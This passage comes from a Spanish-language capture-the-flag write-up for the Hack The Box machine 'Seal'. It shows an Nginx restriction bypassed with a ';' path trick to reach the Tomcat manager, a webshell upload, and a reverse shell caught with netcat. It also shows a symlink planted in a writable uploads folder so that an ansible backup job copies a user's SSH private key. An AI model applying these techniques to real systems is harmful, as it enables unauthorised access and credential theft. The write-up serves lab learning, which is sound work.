                proxy_redirect      http://localhost:8000 https://0.0.0.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
 
 
        location /admin/dashboard &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ssl_client_verify&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; SUCCESS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; 403&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
                proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-Proto &lt;span class=&#34;nv&#34;&gt;$scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_pass          http://localhost:8000&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_read_timeout  90&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_redirect      http://localhost:8000 https://0.0.0.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
 
        location /host-manager/html &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ssl_client_verify&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; SUCCESS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; 403&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
                proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-Proto &lt;span class=&#34;nv&#34;&gt;$scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_pass          http://localhost:8000&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_read_timeout  90&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_redirect      http://localhost:8000 https://0.0.0.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
 
 
        location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-Proto &lt;span class=&#34;nv&#34;&gt;$scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_pass          http://localhost:8000&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_read_timeout  90&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_redirect      http://localhost:8000 https://0.0.0.0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
 
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;luis---account&#34;&gt;Luis - Account&lt;/h2&gt;
&lt;p&gt;En los commits de Seal Market se muestran nombres de posibles usuarios, y, utilizando la contraseÃ±a que encontramos pudimos acceder a la cuenta de Luis, aunque no encontramos algun otro repositorio, pero tenemos permisos sobre uno de los repositorios. Descubrimos tambien, &lt;a href=&#34;https://github.com/kacperszurek/exploits/blob/master/GitBucket/gitbucket-unauthenticated-rce.md&#34;&gt;exploits&lt;/a&gt; que permiten ejecutar comandos aunque no parece afectar a esta version de GitBucket.&lt;/p&gt;
&lt;h2 id=&#34;tomcat&#34;&gt;Tomcat&lt;/h2&gt;
&lt;p&gt;Intentamos subir una shell inversa como en &lt;a href=&#34;https://sckull.github.io/posts/tabby/#tomcat---user&#34;&gt;Tabby - HTB&lt;/a&gt; pero dicha direccion no esta permitida tal y como se define en la configuracion de Nginx, de cierta forma necesitamos hacer algun tipo de Bypass.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Ï€ ~/htb/seal â¯ curl -sk --upload-file batman.war --user &lt;span class=&#34;s1&#34;&gt;&amp;#39;tomcat:42MrHBf*z8{Z%&amp;#39;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://seal.htb/manager/text/deploy?path=/batman&amp;amp;update=True&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; html2text
****** &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Access Denied ******
You are not authorized to view this page.
By default the Manager is only accessible from a browser running on the same
machine as Tomcat. If you wish to modify this restriction, you&lt;span class=&#34;s1&#34;&gt;&amp;#39;ll need to edit
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;the Manager&amp;#39;&lt;/span&gt;s context.xml file.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;seal-market&#34;&gt;Seal Market&lt;/h1&gt;
&lt;p&gt;Encontramos algunos recursos relacionados a Nginx Misconfiguration (&lt;a href=&#34;https://itzone.com.vn/en/article/common-nginx-misconfiguration-puts-your-web-server-at-risk-part-1/&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://www.youtube.com/watch?v=MQpw4oXjIqY&#34;&gt;2&lt;/a&gt;), Security restrictiont bypass (&lt;a href=&#34;https://www.ptsecurity.com/ww-en/analytics/threatscape/pt-2012-06/&#34;&gt;1&lt;/a&gt;) y &lt;a href=&#34;https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/&#34;&gt;Reverse Proxy Attacks&lt;/a&gt;, en este ultimo se muestran algunas formas para realizar bypass. Finalmente en &lt;a href=&#34;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&#34;&gt;Breaking Parser Logic!&lt;/a&gt; (Pag 42-62) se muestran algunos ejemplos entre ellos encontramos un &amp;ldquo;payload&amp;rdquo; (&lt;code&gt;;name=orange&lt;/code&gt;) y el comportamiento que toma en diferentes servidores.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210715_210913.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el ejemplo (&lt;code&gt;http://example.com/foo;name=orange/bar/&lt;/code&gt;) tomcat toma la direccion como &lt;code&gt;/foo/bar/&lt;/code&gt; lo que permitirÃ­a acceder a rutas las cuales no estamos permitidos.&lt;/p&gt;
&lt;p&gt;Al utilizar el &amp;ldquo;payload&amp;rdquo; (&lt;code&gt;;&lt;/code&gt;) en la direccion (&lt;code&gt;https://seal.htb/manager;/html&lt;/code&gt;) del panel de tomcat nos permitiÃ³ acceder con las credenciales de tomcat.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210715_211411.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;tomcat---user&#34;&gt;Tomcat - User&lt;/h1&gt;
&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Por alguna razon Firefox no permite subir un archivo &lt;code&gt;.war&lt;/code&gt; segun parece, por las cookies, creamos y subimos con Chromium una &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#manual-method-web-shell&#34;&gt;webshell&lt;/a&gt; lo que nos permitiÃ³ ejecutar comandos, utilizamos &lt;a href=&#34;https://shell.infosecjack.me/&#34;&gt;Reverse Shell as a Service&lt;/a&gt; para la ejecucion de una shell inversa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/seal â¯ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from seal.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.250&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;58844&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;which python
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;which python3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;/usr/bin/python3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;python3 -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
tomcat
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;997&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tomcat&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;997&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tomcat&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;997&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tomcat&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/var/lib/tomcat9
tomcat@seal:/var/lib/tomcat9$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;luis---user&#34;&gt;Luis - User&lt;/h1&gt;
&lt;p&gt;Listando los procesos vemos el comando &lt;code&gt;ansible-playbook&lt;/code&gt; ejecutando un archivo yaml (&lt;code&gt;run.yml&lt;/code&gt;) cada 30 segundos, dentro de este archivo encontramos 3 tareas, una de estas realiza una copia o backup de los archivos de &lt;code&gt;/var/lib/tomcat9/webapps/ROOT/admin/dashboard&lt;/code&gt; incluyendo los &lt;a href=&#34;https://docs.ansible.com/ansible/2.4/synchronize_module.html#options&#34;&gt;symlinks&lt;/a&gt; luego crea un archivo &lt;code&gt;.gz&lt;/code&gt; en &lt;code&gt;/opt/backups/archives/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tomcat@seal:/$ ps -ef&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep luis
luis         &lt;span class=&#34;m&#34;&gt;878&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;854&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 05:32 ?        00:00:00 /bin/sh -c java -jar /home/luis/gitbucket.war
luis         &lt;span class=&#34;m&#34;&gt;880&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;878&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 05:32 ?        00:21:56 java -jar /home/luis/gitbucket.war
root      &lt;span class=&#34;m&#34;&gt;254757&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;254756&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 22:53 ?        00:00:00 /bin/sh -c sleep &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
tomcat    &lt;span class=&#34;m&#34;&gt;254762&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;252177&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 22:53 pts/1    00:00:00 grep luis
tomcat@seal:/$ ls -lah /usr/bin/ansible-playbook
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/ansible-playbook -&amp;gt; ansible
tomcat@seal:/$ ls -lah /opt/backups/playbook/run.yml
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; luis luis &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 07:14 /opt/backups/playbook/run.yml
tomcat@seal:/$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: &lt;span class=&#34;nv&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/tomcat9/webapps/ROOT/admin/dashboard &lt;span class=&#34;nv&#34;&gt;dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/opt/backups/files &lt;span class=&#34;nv&#34;&gt;copy_links&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&amp;#34;&lt;/span&gt;
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
tomcat@seal:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la carpeta &lt;code&gt;dashboard&lt;/code&gt; encontramos &lt;code&gt;uploads/&lt;/code&gt; dentro de esta tenemos permisos de escritura, creamos un &amp;lsquo;symlink&amp;rsquo; apuntando a la carpeta &lt;code&gt;.ssh&lt;/code&gt; del usuario &lt;strong&gt;Luis&lt;/strong&gt;, ya que el proceso es ejecutado con este usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -lah
total 100K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; root root 4.0K May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 09:26 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root 4.0K May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 10:48 ..
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root root 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; bootstrap
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; css
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root root 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; images
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  71K May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 10:42 index.html
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root root 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; scripts
drwxrwxrwx &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:12 uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh
&amp;lt;ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -lah
total 8.0K
drwxrwxrwx &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root   root   4.0K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:12 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; root   root   4.0K May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 09:26 ..
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; tomcat tomcat   &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:12 .ssh -&amp;gt; /home/luis/.ssh
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que se creÃ³ el backup, realizamos una copia y tras extraer el contenido vemos la clave privada de Luis.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tomcat@seal:/opt/backups/archives$ ls -lah
total 1.8M
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; luis luis 4.0K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:22 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; luis luis 4.0K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:22 ..
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; luis luis 596K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:20 backup-2021-07-16-23:20:32.gz
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; luis luis 596K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:21 backup-2021-07-16-23:21:32.gz
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; luis luis 596K Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:22 backup-2021-07-16-23:22:32.gz
tomcat@seal:/opt/backups/archives$ cp backup-2021-07-16-23:23:32.gz /dev/shm
tomcat@seal:/opt/backups/archives$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /dev/shm
tomcat@seal:/dev/shm$ ls
backup-2021-07-16-23:23:32.gz
tomcat@seal:/dev/shm$ mv backup* backup.gz
